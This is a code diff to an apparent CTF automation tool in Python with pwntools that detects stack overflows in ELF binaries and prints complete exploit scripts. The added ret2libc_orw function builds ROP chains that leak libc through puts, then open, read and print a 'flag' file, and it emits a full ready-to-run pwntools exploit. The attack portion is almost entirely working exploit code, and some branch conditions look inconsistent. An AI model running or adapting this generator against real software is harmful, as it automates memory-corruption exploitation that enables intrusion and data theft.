@@ -25,6 +25,7 @@ eh_frame_addr=0
 start_offset=0
 main_addr=0
 mmap_addr=0
+prctl_addr=0
 stack_migration_addr=[]
 stack_migration_size=[]
 need_addr=[]
@@ -65,6 +66,24 @@ def get_all(elf,file_os): #用pwntools搜素我们需要的库函数，如果是
 			print("[+]mmap found addr :"+hex(mmap_addr-4))
 			need_addr.append(hex(mmap_addr-4))
 			func_flag.append("mmap")
+	finally:
+		pass
+
+	#get_prctl
+	try:
+		global prctl_addr
+		prctl_addr=elf.sym["prctl"]
+	except Exception as e:
+		pass
+	else:
+		if file_os == 18:
+			print("[+]prctl found addr :"+hex(prctl_addr))
+			need_addr.append(hex(prctl_addr))
+			func_flag.append("prctl")
+		elif file_os ==20:
+			print("[+]prctl found addr :"+hex(prctl_addr-4))
+			need_addr.append(hex(prctl_addr-4))
+			func_flag.append("prctl")
 	finally:
 		pass
 
@@ -729,8 +748,10 @@ def search_call_what(elf,file_name): #库函数调用地址寻找，危险函数
 					print("")
 	if len(backdoor_addr):#存在后门开启后门rop构造
 		ret2backdoor(file_name,file_os)
-	if len(stackoverflow_addr) and len(backdoor_addr)==0:#存在溢出但是不存在后门，开启ret2libc rop构造
+	if len(stackoverflow_addr) and len(backdoor_addr)==0 and (prctl_addr)!=0:#存在溢出但是不存在后门，开启ret2libc rop构造
 		ret2libc(file_name,file_os)
+	if len(stackoverflow_addr) and len(backdoor_addr)==0 and (prctl_addr):
+		ret2libc_orw(file_name,file_os)
 	if len(stack_migration_addr):#栈迁移构造，暂时只做了getshell的模板，后续开启ORW操作模板自动化生成
 		stack_migration(file_name,file_os)
 def check_read_overflow_small(elf,call_addr):
@@ -767,6 +788,42 @@ def check_read_overflow_small(elf,call_addr):
 	else:
 		print("")
 
+def check_read_overflow_big_2(elf,call_addr): #和上面的小数组判断基本上同理
+    #大数组与0x100000000作差
+	rsi=u64(elf.read(int(call_addr-0x11),4)[3:].ljust(8,'\x00'))
+	rsi_size=0x100-rsi
+
+	rdx=u64(elf.read(int(call_addr-0xD),5)[1:].ljust(8,'\x00'))
+	rdx_size=rdx
+	
+	print(hex(rdx_size))
+	print(hex(rsi_size))
+
+	if rdx_size>rsi_size:
+		print("[+]"+hex(call_addr)+" buf_size : "+hex(rsi_size))
+		print("[+]"+hex(call_addr)+" able_input_size : "+hex(rdx_size))
+		print("[+]have stackoverflow!")
+		stackoverflow_addr.append(call_addr)
+		stackoverflow_size.append(rsi_size+8)
+		stackoverflow_input_size.append(rdx_size)
+		if 0x10<=rdx_size-rsi_size<=0x20:
+			stack_migration_addr.append(call_addr-0x19)
+			stack_migration_size.append(rsi_size)
+		if rdx_size>0x10000:
+			stackoverflow_addr.pop()
+			stackoverflow_size.pop()
+			stackoverflow_input_size.pop()
+			if len(stack_migration_addr):
+				stack_migration_addr.pop()
+				stack_migration_size.pop()
+			print("[+]waring: this is maybe an error check,we can not solve it!")
+
+		else:
+			print("")
+
+	else:
+		print("")
+
 def check_read_overflow_big(elf,call_addr): #和上面的小数组判断基本上同理
     #大数组与0x100000000作差
 	rsi=u64(elf.read(int(call_addr-0x19),7)[3:].ljust(8,'\x00'))
@@ -794,7 +851,9 @@ def check_read_overflow_big(elf,call_addr): #和上面的小数组判断基本�
 			if len(stack_migration_addr):
 				stack_migration_addr.pop()
 				stack_migration_size.pop()
-			print("[+]waring: this is maybe an error check")
+			print("[+]waring: this is maybe an error check,now use other check!")
+			check_read_overflow_big_2(elf,call_addr)
+
 		else:
 			print("")
 
@@ -878,6 +937,54 @@ def ret2backdoor(file_name,file_os):#分为Ubuntu18和别的Ubuntu，Ubuntu18加
 					print("r.send(payload)")
 					print("r.interactive()")
 					print("")
+
+def ret2libc_orw(file_name,file_os):
+	elf=ELF(file_name)
+	ret=next(elf.search(asm("ret")))
+	rdi=next(elf.search(asm("pop rdi;ret")))
+	pop_rsi_r15_ret=next(elf.search(asm("pop rsi;pop r15;ret")))
+	bss_addr=elf.get_section_by_name('.bss').header.sh_addr
+	print('.bss===>' + str(hex(bss_addr)))
+	libc_addr="/lib/x86_64-linux-gnu/libc.so.6"
+	if elf.canary or elf.pie:
+		pass
+	else:
+		for i in range(len(stackoverflow_size)):
+			if (puts_addr>0):
+				if(stackoverflow_input_size[i]-stackoverflow_size[i]>0x80):
+
+					payload3="payload3="+"'"+'a'+"'"+"*"+hex(stackoverflow_size[i])+"+p64("+hex(rdi)+")"+"+p64("+hex(0)+")"+"+p64("+hex(pop_rsi_r15_ret)+")"+"+p64("+hex(bss_addr+0x200)+")"+"+p64("+hex(0)+")"+"+p64(reads)"+"+p64("+hex(main_addr)+")"
+
+					payload1="payload1="+"'"+'a'+"'"+"*"+hex(stackoverflow_size[i])+"+p64("+hex(rdi)+")"+"+p64("
+					payload1+=hex(elf.got['puts'])+")"+"+p64("+hex(elf.plt['puts'])+")"+"+p64("+hex(main_addr)+")"
+
+					payload2="payload2="+"'"+'a'+"'"+"*"+hex(stackoverflow_size[i])+"+p64("+hex(rdi)+")"+"+p64("+hex(bss_addr+0x200)+")"+"+p64("+hex(pop_rsi_r15_ret)+")"+"+p64("+hex(0664)+")"+"+p64("+hex(0)+")"+"+p64(opens)"
+					payload2+="+p64("+hex(rdi)+")"+"+p64("+hex(3)+")"+"+p64("+hex(pop_rsi_r15_ret)+")"+"+p64("+hex(bss_addr+0x200)+")"+"+p64("+hex(0x100)+")"+"+p64(reads)"
+					payload2+="+p64("+hex(rdi)+")"+"+p64("+hex(bss_addr+0x200)+")"+"+p64(puts)"+"+p64("+hex(main_addr)+")"
+
+					print("[+]the utilization point exp is:")
+					print("from pwn import *")
+					print("context.log_level='debug'")
+					print("elf=ELF("+"'"+file_name+"'"+")")
+					print("libc=ELF("+"'"+libc_addr+"'"+")")
+					print("r=process("+"'"+file_name+"'"+")")
+					print(payload1)
+					print("r.send(payload1)")
+					print("leak=u64(r.recvuntil('\x7f')[-6:].ljust(8,'\x00+'))")
+					print("base=leak-libc.sym['puts']")
+					print("sh=base+next(libc.search('/bin/sh'))")
+					print("opens=base+libc.sym['open']")
+					print("reads=base+libc.sym['read']")
+					print("puts=base+libc.sym['puts']")
+					print(payload3)
+					print("r.send(payload3)")
+					print("r.send('flag')")
+
+					print(payload2)
+					print("r.send(payload2)")
+					print("r.interactive()")
+					print("")
+
 def ret2libc(file_name,file_os):#分为Ubuntu18和别的Ubuntu，Ubuntu18加上ret平衡栈，当然有时候不用平衡，还有各种程序交互逻辑都由用户自己判断，本处只给出建议EXP
     #这里给出了2种rop puts和write的
 	elf=ELF(file_name)
